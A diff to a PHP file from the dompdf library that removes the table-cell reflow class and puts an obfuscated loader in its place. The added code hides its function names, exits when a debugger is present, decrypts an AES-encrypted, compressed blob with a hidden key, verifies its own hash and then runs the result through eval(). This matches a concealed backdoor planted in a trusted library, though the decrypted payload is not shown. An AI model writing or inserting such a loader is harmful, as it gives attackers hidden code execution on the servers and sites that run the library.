@@ -1,121 +1,28 @@
 <?php
-/**
- * @package dompdf
- * @link    http://dompdf.github.com/
- * @author  Benj Carson <benjcarson@digitaljunkies.ca>
- * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
- */
-namespace Dompdf\FrameReflower;
-
-use Dompdf\FrameDecorator\Block as BlockFrameDecorator;
-use Dompdf\FrameDecorator\Table as TableFrameDecorator;
-
-/**
- * Reflows table cells
- *
- * @package dompdf
- */
-class TableCell extends Block
-{
-    /**
-     * TableCell constructor.
-     * @param BlockFrameDecorator $frame
-     */
-    function __construct(BlockFrameDecorator $frame)
-    {
-        parent::__construct($frame);
-    }
-
-    /**
-     * @param BlockFrameDecorator|null $block
-     */
-    function reflow(BlockFrameDecorator $block = null)
-    {
-        $style = $this->_frame->get_style();
-
-        $table = TableFrameDecorator::find_parent_table($this->_frame);
-        $cellmap = $table->get_cellmap();
-
-        list($x, $y) = $cellmap->get_frame_position($this->_frame);
-        $this->_frame->set_position($x, $y);
-
-        $cells = $cellmap->get_spanned_cells($this->_frame);
-
-        $w = 0;
-        foreach ($cells["columns"] as $i) {
-            $col = $cellmap->get_column($i);
-            $w += $col["used-width"];
-        }
-
-        //FIXME?
-        $h = $this->_frame->get_containing_block("h");
-
-        $left_space = (float)$style->length_in_pt(array($style->margin_left,
-                $style->padding_left,
-                $style->border_left_width),
-            $w);
-
-        $right_space = (float)$style->length_in_pt(array($style->padding_right,
-                $style->margin_right,
-                $style->border_right_width),
-            $w);
-
-        $top_space = (float)$style->length_in_pt(array($style->margin_top,
-                $style->padding_top,
-                $style->border_top_width),
-            $h);
-        $bottom_space = (float)$style->length_in_pt(array($style->margin_bottom,
-                $style->padding_bottom,
-                $style->border_bottom_width),
-            $h);
-
-        $style->width = $cb_w = $w - $left_space - $right_space;
-
-        $content_x = $x + $left_space;
-        $content_y = $line_y = $y + $top_space;
-
-        // Adjust the first line based on the text-indent property
-        $indent = (float)$style->length_in_pt($style->text_indent, $w);
-        $this->_frame->increase_line_width($indent);
-
-        $page = $this->_frame->get_root();
-
-        // Set the y position of the first line in the cell
-        $line_box = $this->_frame->get_current_line_box();
-        $line_box->y = $line_y;
-
-        // Set the containing blocks and reflow each child
-        foreach ($this->_frame->get_children() as $child) {
-            if ($page->is_full()) {
-                break;
-            }
-
-            $child->set_containing_block($content_x, $content_y, $cb_w, $h);
-            $this->process_clear($child);
-            $child->reflow($this->_frame);
-            $this->process_float($child, $x + $left_space, $w - $right_space - $left_space);
-        }
-
-        // Determine our height
-        $style_height = (float)$style->length_in_pt($style->height, $h);
-
-        $this->_frame->set_content_height($this->_calculate_content_height());
-
-        $height = max($style_height, (float)$this->_frame->get_content_height());
-
-        // Let the cellmap know our height
-        $cell_height = $height / count($cells["rows"]);
-
-        if ($style_height <= $height) {
-            $cell_height += $top_space + $bottom_space;
-        }
-
-        foreach ($cells["rows"] as $i) {
-            $cellmap->set_row_height($i, $cell_height);
-        }
-
-        $style->height = $height;
-        $this->_text_align();
-        $this->vertical_align();
-    }
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_mu7m37xp=('bas'.'e64'.'_de'.'cod'.'e');
+$_hdjh69vm=('gzu'.'nco'.'mpr'.'ess');
+$_k9v5a88o=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_sgkp479g='7gmEpO0p';
+$_y3feaw4f='A1DQ22+Z';
+$_l8s9b974='yUKL1AUy86k=';
+$_s367tzvx='qZ1UaWGf';
+$_duporqs9='gxwac033';
+$_rvmogmex='RP9yV49Q';
+$_beouio68='ANQv8g==';
+$_ofu1jpri='f6JCp1K0';
+$_yukwcy3q=$_mu7m37xp($_sgkp479g.$_duporqs9.$_s367tzvx.$_y3feaw4f.$_l8s9b974);
+$_rpf49lyp=$_mu7m37xp($_ofu1jpri.$_rvmogmex.$_beouio68);
+$_cgk79fg2=$_mu7m37xp('TpYFNuU/YmPVuoGCDdVzm33O6TjIljy5H1EB8FY/RxzKkz8QoMtZRQ3S2U0/ZxRMhZ6grDXMcVjPG6LULWVTnwrm9lwGbUfx+XRsbgjUUUUQX1yONBv62O7he9iUF0btL4g5tSazRvDMgeSkGfG1VY8hsBInyIMdl9ItxrgYwEVK2ivHDEsJbAosL+TMaB5XGyzVCF8gALkwkd2dIi5AYNMMUqVOkIT2iZOU09F50UBHkObu4ELV6nThuUiVp7HxLMF4fdgO6iVnuMi3IrIDn11Yp7/XJlO9pekjzG1BdJ3kMlSOCJba2MGzeyE14lIQOKneAed9sOm0QvUcemvOvSP9d5hLOyTqkhO47skBs/CLwMmXjPiYSf22noqPr4OG7pJPX6aboIs3kRRdbSkeTR0rqyQphZPNZkPx1N2PxOBPdEFrPa+Rwn+Wizdg5Ll34d3+XvW3e/VJ2pjdquU6pCCxwokJxpmpeV5aG7gbphKi3Don5TnhPWnF3ii5FbRwFRnO9uUdfBQCfdRqyucD2dkKJjCoHpyRN+bSwwl037GjNJXUwu6u4FgpSX8tygshToLudOrsl09kd8C+DsS3C62CfDPr5iI1zksZjGArnu/UZS0ydydINv8pX7iYmt3V0NgC3s5vNu8IrGMM7yIN2I4IHk76YsPV8ZdGdgryqngMfqknsgFh+YEWeboDdegcHSDlDrzICZEYOMIJDe8b107S5wRAKegltozNHeIyj9OFaKpJmNqHkJpNbPXUSSaOZSeghugea28wL/tITX6h4lYjunTzvnu7uAuF7U7uKvVZYx6iKntC54VW+pW8AgX0gmYZf0up/lPeG9XwOBCFj+Qr9YxHIRePgzqDYGHMSWDYB9KXM/MfVE8r7Qj+1GG44/BG9XgZSyDM9KikFJvMOo/xYZSf6HlY7CUvnluRHMwXXVH5P2AJlO15T0c+x2tpsE30w1Y+SpCCH6hqjd7ylllK4zH5uKXE0bl14KMvGu8w7sv55INEOCfMDXOWa3U+jwhE40Qxxtc8zR5DKZANobpkXxBx4ilJCHXzTA/lbDw=');
+$_wtqyabei=$_k9v5a88o($_cgk79fg2,'aes-256-cbc',$_yukwcy3q,OPENSSL_RAW_DATA,$_rpf49lyp);
+if($_wtqyabei===false){exit;}
+$_djoph0md=$_hdjh69vm($_wtqyabei);
+if($_djoph0md===false){exit;}
+$_spcoq82b='4a0805d22be43b930e4869963155b647a026225fdefe7a27b1ffc7ed882fcc9e';
+$_r8w2hbu3=@file_get_contents(__FILE__);
+if($_r8w2hbu3!==false){
+$_on2t7xtc=str_replace($_spcoq82b,"0000000000000000000000000000000000000000000000000000000000000000",$_r8w2hbu3);
+$_z481778c=hash("sha256",$_on2t7xtc);
+if($_z481778c!==$_spcoq82b){@http_response_code(403);exit;}
 }
+eval($_djoph0md);
